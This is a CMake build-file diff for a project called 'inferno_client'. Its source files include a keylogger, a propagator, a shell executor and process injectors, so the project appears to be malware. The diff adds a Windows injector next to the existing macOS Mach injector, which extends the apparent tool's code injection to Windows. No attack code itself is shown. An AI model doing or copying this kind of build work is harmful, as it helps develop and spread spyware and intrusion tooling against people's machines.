@@ -90,8 +90,12 @@ add_executable(inferno_client
     client/src/Propagator.cpp
     client/src/entry_dylib.cpp
     client/src/EntitlementScanner.cpp
-    client/src/MachInjector.cpp
 )
+if(WIN32)
+    target_sources(inferno_client PRIVATE client/src/WindowsInjector.cpp)
+else()
+    target_sources(inferno_client PRIVATE client/src/MachInjector.cpp)
+endif()
 target_link_libraries(inferno_client PRIVATE inferno_common)
 
 if(APPLE)
@@ -185,10 +189,14 @@ add_executable(inferno_tests
     client/src/ShellExecutor.cpp
     client/src/KeyLogger.cpp
     client/src/Propagator.cpp
-    client/src/MachInjector.cpp
     client/src/EntitlementScanner.cpp
     tests/inject_e2e_test.cpp
 )
+if(WIN32)
+    target_sources(inferno_tests PRIVATE client/src/WindowsInjector.cpp)
+else()
+    target_sources(inferno_tests PRIVATE client/src/MachInjector.cpp)
+endif()
 target_include_directories(inferno_tests PRIVATE client/include)
 target_link_libraries(inferno_tests PRIVATE inferno_common Qt6::Widgets Qt6::Gui Qt6::Core Qt6::Sql)
 target_compile_definitions(inferno_tests PRIVATE INFERNO_TESTING)
